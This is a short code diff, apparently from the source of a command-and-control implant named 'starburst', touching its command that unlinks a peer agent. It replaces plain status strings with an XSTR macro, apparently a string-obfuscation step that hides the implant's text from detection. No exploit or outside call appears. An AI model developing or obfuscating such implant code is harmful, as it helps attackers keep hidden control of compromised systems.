@@ -21,7 +21,7 @@ auto declfn starburst::cmd_unlink(
 
     if ( !agent_uuid || agent_uuid_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "missing agent id" ) ) );
+            XSTR( "missing agent id" ) );
         return;
     }
 
@@ -93,10 +93,10 @@ auto declfn starburst::cmd_unlink(
 
     if ( found ) {
         queue_response( inst, task_uuid, RESPONSE_SUCCESS,
-            symbol<char*>( const_cast<char*>( "unlinked" ) ) );
+            XSTR( "unlinked" ) );
     } else {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "agent not found in links" ) ) );
+            XSTR( "agent not found in links" ) );
     }
 }
 
